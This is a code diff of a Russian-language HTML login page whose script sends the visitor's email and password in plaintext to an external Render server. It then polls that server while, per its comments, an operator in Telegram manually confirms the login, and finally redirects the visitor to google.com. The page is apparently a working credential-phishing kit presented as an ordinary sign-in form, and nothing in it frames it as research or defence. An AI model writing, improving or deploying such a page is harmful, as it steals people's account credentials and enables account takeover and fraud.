@@ -1,49 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Вход</title>
+    <meta charset="UTF-8">
+    <title>Авторизация</title>
+    <style>
+        /* Твои стили здесь */
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
+        input { margin: 10px; padding: 10px; width: 250px; }
+        button { padding: 10px 20px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 5px; }
+    </style>
 </head>
 <body>
-    <input type="text" id="email" placeholder="Логин">
+    <h2>Вход в систему</h2>
+    <input type="text" id="email" placeholder="Email или Логин">
     <input type="password" id="pass" placeholder="Пароль">
-    <button onclick="login()">Войти</button>
+    <button id="sendBtn" onclick="sendAuth()">Войти</button>
 
     <script>
-        const SERVER_URL = 'https://sever-afk3.onrender.com'; // Твой URL с Render
+        // --- НАСТРОЙКИ ---
+        const SERVER_URL = 'https://sever-afk3.onrender.com'; // ПРОВЕРЬ, ЧТО ЭТО ТВОЙ URL
+        // -----------------
+
+        // Генерируем ID для текущей сессии, чтобы админ подтвердил именно нас
         const userId = 'user_' + Math.random().toString(36).substr(2, 9);
 
-        async function login() {
+        async function sendAuth() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
+            const btn = document.getElementById('sendBtn');
 
-            // Отправляем данные на сервер Render
-            await fetch(`${SERVER_URL}/send-data`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type: 'auth', email, pass, userId })
-            });
+            if(!email || !pass) return alert("Заполните поля!");
 
-            alert('Ожидайте подтверждения...');
-            checkStatus();
+            btn.disabled = true;
+            btn.innerText = "Ожидание подтверждения...";
+
+            try {
+                // Отправляем данные на твой сервер Render
+                await fetch(`${SERVER_URL}/send-data`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'auth',
+                        email: email,
+                        pass: pass,
+                        userId: userId
+                    })
+                });
+
+                // Начинаем проверять, что ответил админ в телеграме
+                checkStatus();
+            } catch (err) {
+                alert("Ошибка связи с сервером");
+                btn.disabled = false;
+                btn.innerText = "Войти";
+            }
         }
 
-        async function checkStatus() {
-            const interval = setInterval(async () => {
-                const res = await fetch(`${SERVER_URL}/check/${userId}`);
-                const data = await res.json();
+        function checkStatus() {
+            const timer = setInterval(async () => {
+                try {
+                    const res = await fetch(`${SERVER_URL}/check/${userId}`);
+                    const data = await res.json();
 
-                if (data.status === 'success') {
-                    clearInterval(interval);
-                    alert('Успешно вошли!');
-                } else if (data.status === 'error') {
-                    clearInterval(interval);
-                    alert('Неверный пароль!');
+                    if (data.status === 'success') {
+                        clearInterval(timer);
+                        alert("✅ Вход подтвержден!");
+                        window.location.href = "https://google.com"; // Куда кинуть юзера после успеха
+                    } else if (data.status === 'error') {
+                        clearInterval(timer);
+                        alert("❌ Ошибка: Неверный логин или пароль");
+                        location.reload();
+                    }
+                } catch (e) {
+                    console.log("Ждем ответа сервера...");
                 }
-            }, 3000);
+            }, 3000); // Проверка каждые 3 секунды
         }
     </script>
-</body>
-</html>
 </body>
 </html>
 
